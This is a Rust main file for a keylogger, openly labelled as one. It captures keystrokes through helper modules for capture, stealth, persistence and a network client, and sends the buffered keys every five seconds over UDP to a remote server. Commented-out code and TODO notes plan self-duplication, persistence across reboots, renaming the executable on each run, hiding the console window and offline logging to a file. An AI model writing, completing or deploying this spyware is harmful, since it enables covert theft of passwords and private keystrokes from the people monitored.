use core::time;
use std::thread;
use rdev::Key;
use std::net::UdpSocket;
use std::sync::{Arc, Mutex};

mod capture;
mod stealth;
mod persistence;
mod client;

const SEND_INTERVAL_SECS: u64 = 5;

fn main() {
    println!("Keylogger");

    // let args: Vec<String> = env::args().collect();
    // let is_spoofed = args.len() == 2 && args[1] == "spoofed";

    // if !is_spoofed {
    //     if let Ok(path) = duplicate_itself() {
    //         clean_old_persistence();
    //         add_persistence();
    //
    //         println!("Running the spoofed executable");
    //         run_program(&path);
    //     }
    //     return; // Exit whatever happens
    // }

    let socket: UdpSocket = match client::create_socket() {
        Ok(socket) => socket,
        _ => panic!("Could not create socket"),
    };

    let shared_buffer = Arc::new(Mutex::new(Vec::<Key>::new()));

    // Create clones of the buffer for the threads
    let buffer_clone_for_populating = Arc::clone(&shared_buffer);
    let buffer_clone_for_accessing = Arc::clone(&shared_buffer);

    thread::spawn(move || loop {
        {
            let mut buffer = buffer_clone_for_accessing.lock().unwrap();

            if !buffer.is_empty() {
                client::send_buffer_key(&socket, &buffer);
                buffer.clear();
            }
        }

        thread::sleep(time::Duration::from_secs(SEND_INTERVAL_SECS));
        // Mutex automatically unlocks due to Rust's RAII
    });

    capture::listen_to_events(buffer_clone_for_populating);

    // TODO: hide_console_window();
    
    // TODO: get old executable path from args
    // TODO: remove old executable                => program change name at each run (= each reboot)

    // TODO: (in other thread) Each 30s try to connect to server
    // TODO:   if connected:
    // TODO:     set output to socket
    // TODO:     if log file is not empty, send it
    // TODO:   else:
    // TODO:     set output to file

    // TODO: capture the key strokes (rdev ?)

    loop {}
}
